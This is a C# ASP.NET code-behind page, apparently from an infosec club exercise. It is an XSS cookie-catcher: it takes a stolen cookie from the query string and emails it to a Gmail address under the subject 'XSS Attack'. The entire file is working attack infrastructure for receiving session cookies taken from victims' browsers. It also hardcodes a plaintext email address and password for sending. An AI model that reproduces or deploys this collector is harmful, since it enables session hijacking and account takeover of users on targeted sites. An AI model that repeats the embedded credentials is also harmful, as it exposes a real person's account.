using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;
using System.Net;
using System.Net.Mail;

using System.Text;
using System.IO;
using System.Collections;


namespace WebApplication5
{
    public partial class XSS : System.Web.UI.Page
    {
        protected void Page_Load(object sender, EventArgs e)
        {
            //GETS COOKIE FROM POST METHOD
            String cookie = Request.QueryString["cookie"];
             //GETS COOKIE FROM GET METHOD
            if (!cookie.Equals(""))
            {
                  cookie = Request.QueryString.ToString();
            }
             var fromAddress = new MailAddress("vivi.langga@gmail.com", "InfoSec Club");
            var toAddress = new MailAddress("vivi.langga@gmail.com","Vivi Langga");
            const string fromPassword = "sushi3231";
            const string subject = "XSS Attack";
            string body = "The cookie is: " +cookie;
            var smtp = new SmtpClient
            {
                Host = "smtp.gmail.com",
                Port = 587,
                EnableSsl = true,
                DeliveryMethod = SmtpDeliveryMethod.Network,
                UseDefaultCredentials = false,
                Credentials = new NetworkCredential(fromAddress.Address, fromPassword)
            };
            using (var message = new MailMessage(fromAddress, toAddress)
            {
                Subject = subject,
                Body = body
            })
            {
                smtp.Send(message);
            }

       

        }
    }
}